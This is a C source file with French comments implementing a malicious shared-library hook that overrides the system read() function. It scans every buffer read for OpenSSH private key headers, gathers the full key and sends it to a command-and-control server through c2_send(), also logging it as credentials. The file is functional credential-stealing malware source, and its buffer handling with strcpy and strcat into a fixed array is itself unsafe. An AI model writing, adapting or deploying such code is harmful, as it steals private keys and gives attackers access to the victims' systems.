#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include "c2_client.h"
#include "utils.h"  

static ssize_t (*real_read)(int, void*, size_t) = NULL;
static char ssh_key_buffer[8192];  // Tampon pour stocker les clés SSH détectées
static int ssh_key_detected = 0;   // Indicateur de détection d'une clé

ssize_t read(int fd, void *buf, size_t count) {
    // Charger la fonction originale
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
        if (!real_read) {
            fprintf(stderr, "[hook_read] Erreur : impossible de charger read\n");
            _exit(1);
        }
    }

    // Appel de la fonction originale
    ssize_t ret = real_read(fd, buf, count);

    if (ret > 0) {
        fprintf(stderr, "[hook_read] fd=%d, %zd octets lus\n", fd, ret);

        // Vérifier si on détecte une clé SSH
        if (strstr((char *)buf, "BEGIN OPENSSH PRIVATE KEY")) {
            fprintf(stderr, "[hook_read] Détection d'une clé SSH, début de capture...\n");
            ssh_key_detected = 1;
            strcpy(ssh_key_buffer, (char *)buf);
        } 
        else if (ssh_key_detected) {
            // On continue d'agréger les lignes suivantes de la clé
            strcat(ssh_key_buffer, (char *)buf);

            // Vérifier si c'est la fin de la clé SSH
            if (strstr((char *)buf, "END OPENSSH PRIVATE KEY")) {
                fprintf(stderr, "[hook_read] Fin de clé SSH détectée ! Envoi au C2...\n");
                c2_send(ssh_key_buffer);
                log_credentials(ssh_key_buffer);
                ssh_key_detected = 0;  // Réinitialiser la détection
            }
        }
    }

    return ret;
}
